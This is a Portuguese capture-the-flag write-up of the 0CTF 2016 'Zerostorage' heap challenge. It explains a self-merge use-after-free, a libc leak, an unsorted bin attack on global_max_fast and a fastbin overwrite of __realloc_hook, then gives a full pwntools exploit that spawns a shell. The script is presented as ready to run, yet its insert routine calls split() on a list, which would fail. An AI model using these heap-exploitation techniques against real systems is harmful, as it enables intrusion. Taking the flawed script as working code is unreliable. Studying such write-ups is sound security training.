O **Zerostorage** é um desafio de nível difícil da categoria **Pwn** apresentado na competição **0CTF 2016**, focado na exploração de memória dinâmica por meio de **Heap Exploitation**. A análise das proteções do binário via checksec revela uma arquitetura de 64 bits **amd64** compilada com **Full RELRO**, **Stack Canary**, **NX habilitado** e **PIE habilitado**. A presença da proteção **Full RELRO** impede a sobrescrita direta da tabela Global Offset Table (GOT), enquanto o **Stack Canary** e o **NX** bloqueiam estouros de pilha convencionais e a execução direta de shellcode, redirecionando o vetor de ataque para estruturas dinâmicas na heap e hooks da glibc 2.19. Adicionalmente, a mitigação **PIE** sorteia o endereço base do executável a cada inicialização, tornando indispensável a obtenção de um vazamento de memória para calcular o deslocamento dos símbolos da biblioteca em tempo de execução.

No binário Zerostorage, a organização do estado global e a manipulação da memória dinâmica podem ser observadas diretamente na seção BSS e no código decompilado das funções do menu. O estado global é mantido por meio de um contador de entradas em `unk_203040`, uma chave aleatória de 8 bytes lida de `/dev/urandom` em `unk_203048`, e um array de até 32 entradas na estrutura `stru_203060`. Cada elemento dessa tabela possui 24 bytes (estrutura `entry_t`), contendo um inteiro `status`, o tamanho solicitado `size` e o ponteiro de dados codificado `data_enc` via operação XOR com a chave secreta. Na rotina de inserção `insert_sub_FD0`, a função aloca memória invocando `calloc(nmemb: v5, size: 1u)`, aplicando um piso mínimo de 128 bytes (0x80 bytes), conforme o trecho decompilado:

```c
v4 = 4096;
v5 = 128;
if ( v2 <= 4096 )
  v4 = v2;
if ( v4 >= 128 )
  v5 = v4;
v6 = calloc(nmemb: v5, size: 1u);
...
v8 = &stru_203060[v0];
v8->status = 1;
v8->size = v4;
v8->data_enc = (char *)(unk_203048 ^ (unsigned __int64)v6);
```

Esse trecho demonstra que a variável `v5` (piso de 128 bytes) é repassada ao `calloc`, mas o campo `v8->size` armazena `v4`, que é exatamente o tamanho fornecido pelo usuário. Na rotina de atualização `update_sub_1120`, o código recalculado indica que a função `realloc` só é acionada se a alteração de tamanho modificar esse piso de 128 bytes, gravando diretamente no buffer existente caso contrário:

```c
v7 = 128;
LODWORD(size) = 128;
if ( v6 >= 128 )
  v7 = v6;
v9 = unk_203048 ^ (__int64)v3->data_enc;
if ( v3->size >= 0x80 )
  size = v3->size;
if ( v7 != (_DWORD)size )
{
  v9 = (unsigned __int64)realloc(ptr: (void *)(unk_203048 ^ (__int64)v3->data_enc), size: v7);
}
```

A vulnerabilidade de **Use-After-Free (UAF)** e a operação falha de **Self-Merge** derivam do exame detalhado da função de mesclagem `merge_sub_12C0`. A rotina decompilada revela a ausência de uma validação que impeça a seleção do mesmo índice de entrada para os parâmetros de origem (`v3`) e destino (`v7`), permitindo a execução de chamadas do tipo `Merge(A, A)`. O trecho final de `merge_sub_12C0` expõe a ordem incorreta das operações:

```c
v20 = (char *)&unk_203060 + 24 * v0;
*((_QWORD *)v20 + 2) = unk_203048 ^ v24;
v21 = (void *)(*((_QWORD *)v18 + 2) ^ v19);
*(_DWORD *)v20 = 1;
*((_QWORD *)v20 + 1) = v26;
*(_DWORD *)v18 = 0;
*((_QWORD *)v18 + 1) = 0;
free(ptr: v21);
*((_QWORD *)v18 + 2) = 0;
```

A análise desse segmento confirma que o programa cria a nova entrada `v20` apontando para o buffer `v24` antes de executar a instrução `free(ptr: v21)` sobre a entrada de origem `v18`. Quando origem e destino são idênticos, `v21` é exatamente o buffer recém-atribuído a `v20`, resultando na liberação da memória no alocador sem anular a nova referência. Em contrapartida, a decompilação da função `delete_sub_1530` demonstra o comportamento seguro de liberação:

```c
v1->status = 0;
v1->size = 0;
...
free(ptr: (void *)(unk_203048 ^ (unsigned __int64)data_enc));
v1->data_enc = nullptr;
```

Como a nova entrada criada pelo self-merge mantém o status ativo e preserva o tamanho coerente, a aplicação disponibiliza primitivas imediatas de leitura através da função `view` e de escrita por meio da função `update_sub_1120` diretamente sobre a memória liberada.

A obtenção do **Information Leak** ocorre ao acionar a operação de self-merge sobre uma alocação que excede o limite das fastbins, fazendo com que a glibc 2.19 insira o chunk liberado na **Unsorted Bin**. O alocador grava nos primeiros 16 bytes da área de dados liberada os ponteiros de encadeamento `fd` (*forward pointer*) e `bk` (*backward pointer*). Quando esse bloco é o único elemento presente na Unsorted Bin, ambos os ponteiros armazenam o endereço da estrutura `main_arena` da biblioteca C. Ao executar a função `view` na entrada fantasma gerada pelo self-merge, o programa lê o ponteiro `fd` gravado no buffer liberado. A partir dessa leitura, subtrai-se o deslocamento fixo de `main_arena` na glibc 2.19 (`OFF_UNSORTED = 0x3BE7B8`) para calcular com precisão o endereço base da biblioteca `libc_base` em memória.

A técnica de **Unsorted Bin Attack** explora o mecanismo de remoção de blocos da Unsorted Bin durante a rotina interna de alocação `_int_malloc`. A glibc 2.19 executa a instrução `bck->fd = unsorted_chunks(av)` sem validar a integridade da lista duplamente encadeada. Utilizando a primitiva de escrita em memória liberada fornecida pela função `update_sub_1120`, altera-se o ponteiro `bk` do chunk liberado para o endereço do alvo desejado menos 0x10 bytes (`libc_base + OFF_GLOBAL_MAX_FAST - 0x10`). Na alocação subsequente, o alocador escreve o endereço de `unsorted_chunks(av)` (um ponteiro da `main_arena`) na variável global `global_max_fast` da libc 2.19. A variável **global_max_fast** define o limite máximo de tamanho de bloco gerenciado pelas Fastbins. Ao receber o valor elevado do ponteiro da arena, esse limite é drasticamente expandido, fazendo com que o alocador passe a tratar blocos de grande dimensão como se fossem Fastbins.

O **Fastbin Attack** tira proveito da elevação de `global_max_fast` para forjar alocações em regiões arbitrárias de memória da biblioteca. A realização de um segundo self-merge em uma entrada de grande tamanho faz com que o chunk liberado seja inserido na lista da Fastbin correspondente à sua dimensão. Por meio de uma nova escrita via `update_sub_1120`, o ponteiro de encadeamento `fd` desse chunk é sobrescrito com o endereço de um bloco falso (`FAKE_CHUNK = 0x3BE6FF - 8`) posicionado na região anterior a **__realloc_hook** (`OFF_REALLOC_HOOK = 0x3BE730`), onde existe um byte que o alocador aceita como campo de tamanho válido (`0x300`). Duas alocações sucessivas do mesmo tamanho limpam a Fastbin: a primeira devolve o chunk real e a segunda retorna um ponteiro para a memória forjada na libc, permitindo sobrescrever a variável **__realloc_hook** com o endereço da função **system** (`OFF_SYSTEM = 0x46640`).

A **Cadeia de Exploração do Zerostorage** sintetiza a sequência de vulnerabilidades e primitivas articuladas para obter a execução de código. Inicialmente, a operação de **Self-Merge** explora a falha de validação na função `merge_sub_12C0`, gerando a condição de **Use-After-Free** e preservando um ponteiro ativo para a memória liberada. A leitura dos metadados da Unsorted Bin via `view` resulta no **Information Leak** da biblioteca. Em seguida, a edição do campo `bk` via `update_sub_1120` aciona o **Unsorted Bin Attack**, elevando drasticamente a variável **global_max_fast**. A reconfiguração do alocador permite que um segundo self-merge direcione um bloco grande para a Fastbin, viabilizando o **Fastbin Attack** ao corromper o ponteiro `fd` e forjar um chunk na libc. Esse chunk dá acesso à sobrescrita de **__realloc_hook** com o endereço de **system**. Por fim, ao chamar a atualização em uma entrada contendo a string `/bin/sh` com um tamanho modificado, o programa executa a rotina `realloc`, que redireciona a chamada para `system("/bin/sh")` e fornece o shell interativo.

A **Importância da Versão da Glibc** é um fator determinante para a eficácia do exploit, pois os deslocamentos de memória e comportamentos de alocação dependem estritamente da build **Ubuntu EGLIBC 2.19-0ubuntu6.7** do desafio. Deslocamentos fixos como `OFF_UNSORTED` (0x3BE7B8), `OFF_GLOBAL_MAX_FAST` (0x3C0B40), `OFF_REALLOC_HOOK` (0x3BE730) e `OFF_SYSTEM` (0x46640) só são válidos nessa versão específica. Para garantir a reprodutibilidade, o ambiente de execução é isolado por meio de um Dockerfile que instala a libc 2.19 e o vinculador dinâmico `ld-2.19.so`. Em tempo de execução, a integridade da biblioteca é validada via MD5 (`LIBC_219_MD5 = "ac6e8213081cc6f5a16779214a90d952"`), garantindo que o programa seja executado com a estrutura exata de heap esperada.

O script de exploração em Python abaixo utiliza o framework pwntools e reflete a cadeia descrita, estando pronto para ser executado no ambiente configurado com a libc 2.19:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import hashlib
import os
import struct
import time

from pwn import context, log, p64, process, u64

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = SCRIPT_DIR
LOCAL_BINARY = os.path.join(ROOT_DIR, "zerostorage")
LIBS_DIR = os.path.join(ROOT_DIR, "libs")
LIBC_219_MD5 = "ac6e8213081cc6f5a16779214a90d952"

def md5_file(path):
    h = hashlib.md5()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(0x10000), b""):
            h.update(chunk)
    return h.hexdigest()

class ZeroStorage:
    def __init__(self, io):
        self.io = io

    def _choose(self, option):
        self.io.recvuntil(b"Your choice: ")
        self.io.sendline(str(option).encode())

    def insert(self, size, data):
        assert len(data) == size, "insert: tamanho dos dados != size"
        self._choose(1)
        self.io.sendlineafter(b"Length of new entry: ", str(size).encode())
        self.io.sendafter(b"Enter your data: ", data)
        reply = self.io.recvuntil(b" is successfully inserted.")
        return int(reply.split(b"New entry ").split())

    def update(self, idx, size, data):
        assert len(data) == size, "update: tamanho dos dados != size"
        self._choose(2)
        self.io.sendlineafter(b"Entry ID: ", str(idx).encode())
        self.io.sendlineafter(b"Length of entry: ", str(size).encode())
        self.io.sendafter(b"Enter your data: ", data)
        self.io.recvuntil(b" is successfully updated.")

    def merge(self, from_id, to_id):
        self._choose(3)
        self.io.sendlineafter(b"Merge from Entry ID: ", str(from_id).encode())
        self.io.sendlineafter(b"Merge to Entry ID: ", str(to_id).encode())
        self.io.recvuntil(b"New entry ID is ")
        new_id = int(self.io.recvuntil(b".", drop=True))
        self.io.recvuntil(b"\n")
        return new_id

    def delete(self, idx):
        self._choose(4)
        self.io.sendlineafter(b"Entry ID: ", str(idx).encode())
        self.io.recvuntil(b" is successfully deleted.")

    def view(self, idx, size):
        self._choose(5)
        self.io.sendlineafter(b"Entry ID: ", str(idx).encode())
        self.io.recvuntil(b"Entry No.")
        self.io.recvuntil(b":\n")
        data = self.io.recvn(size)
        self.io.recvuntil(b"\n")
        return data

    def exit(self):
        self._choose(7)

def put64(buf, offset, value):
    struct.pack_into("<Q", buf, offset, value)

context.arch = "amd64"
context.log_level = "info"

OFF_UNSORTED = 0x3BE7B8
OFF_GLOBAL_MAX_FAST = 0x3C0B40
OFF_REALLOC_HOOK = 0x3BE730
OFF_SYSTEM = 0x46640

FAKE_SIZE_FIELD = 0x3BE6FF
FAKE_CHUNK = FAKE_SIZE_FIELD - 8
FAKE_USER = FAKE_CHUNK + 0x10
REALLOC_HOOK_OFFSET = OFF_REALLOC_HOOK - FAKE_USER

GMF_SMALL_SIZE = 0x20
GMF_GUARD_SIZE = 0xFC
GMF_BIG_SIZE = 0x17C
GMF_FAST_SIZE = 0x2F8

def build_gmf_corruption(libc_base):
    c = bytearray(GMF_SMALL_SIZE)
    c[0x00:0x08] = b"a" * 8
    put64(c, 0x08, libc_base + OFF_GLOBAL_MAX_FAST - 0x10)
    return bytes(c)

def build_fastbin_payload_219(libc_base):
    p = bytearray(GMF_FAST_SIZE)
    put64(p, REALLOC_HOOK_OFFSET, libc_base + OFF_SYSTEM)
    return bytes(p)

def run_gmf(io):
    log.info("técnica: unsorted bin attack -> global_max_fast -> fastbin")
    z = ZeroStorage(io)

    small = z.insert(GMF_SMALL_SIZE, b"A" * GMF_SMALL_SIZE)
    guard = z.insert(GMF_GUARD_SIZE, b"B" * GMF_GUARD_SIZE)
    big = z.insert(GMF_BIG_SIZE, b"E" * GMF_BIG_SIZE)
    log.info("ids: small=%d guard=%d big=%d", small, guard, big)

    uaf = z.merge(small, small)
    leak = u64(z.view(uaf, GMF_SMALL_SIZE)[:8])
    libc_base = leak - OFF_UNSORTED
    assert libc_base & 0xFFF == 0, "leak inválido: %#x" % leak
    log.success("libc base = %#x", libc_base)

    log.info("global_max_fast = %#x", libc_base + OFF_GLOBAL_MAX_FAST)
    log.info("fake chunk       = %#x", libc_base + FAKE_CHUNK)

    z.update(uaf, GMF_SMALL_SIZE, build_gmf_corruption(libc_base))

    bin_sh = z.insert(GMF_SMALL_SIZE, b"/bin/sh\x00" + b"D" * 0x18)

    uaf_big = z.merge(big, big)
    log.info("entrada UAF grande = %d", uaf_big)

    fake = libc_base + FAKE_CHUNK
    z.update(uaf_big, GMF_FAST_SIZE, p64(fake) + b"\x00" * (GMF_FAST_SIZE - 8))

    z.insert(GMF_FAST_SIZE, b"Q" * GMF_FAST_SIZE)
    z.insert(GMF_FAST_SIZE, build_fastbin_payload_219(libc_base))
    log.success("__realloc_hook = system")

    z._choose(2)
    io.sendlineafter(b"Entry ID: ", str(bin_sh).encode())
    io.sendline(str(0x100).encode())
    time.sleep(0.4)

    io.interactive()

def find_loader_219():
    candidates = []
    env = os.environ.get("ZS_LOADER_219")
    if env:
        candidates.append(env)
    candidates += [
        os.path.join(LIBS_DIR, "ld-2.19.so"),
        os.path.join(LIBS_DIR, "ld-linux-x86-64.so.2"),
        os.path.join(SCRIPT_DIR, "ld-2.19.so"),
        "/tmp/opencode/zs219/root/lib/x86_64-linux-gnu/ld-2.19.so",
    ]

    for path in candidates:
        if os.path.isfile(path):
            return path
    return None

def run_libc219():
    loader = find_loader_219()
    if loader is None:
        raise SystemExit(
            "loader 2.19 não encontrado.\n"
            "Coloque ld-2.19.so em libs/ ou defina "
            "ZS_LOADER_219=<caminho do ld-2.19.so>."
        )

    libdir = os.path.dirname(loader)
    if not os.path.isfile(os.path.join(libdir, "libc.so.6")):
        libdir = LIBS_DIR

    libc = os.path.join(libdir, "libc.so.6")
    if not os.path.isfile(libc) or md5_file(libc) != LIBC_219_MD5:
        raise SystemExit(
            "este exploit só funciona com a libc 2.19 fornecida.\n"
            "libc esperada: %s (md5 %s)"
            % (os.path.join(LIBS_DIR, "libc.so.6"), LIBC_219_MD5)
        )

    log.info("loader 2.19: %s", loader)
    log.info("libc   2.19: %s (md5 OK)", libc)

    io = process(
        [loader, "--library-path", libdir, LOCAL_BINARY],
        cwd=ROOT_DIR,
    )
    try:
        run_gmf(io)
    finally:
        io.close()

if __name__ == "__main__":
    run_libc219()
`
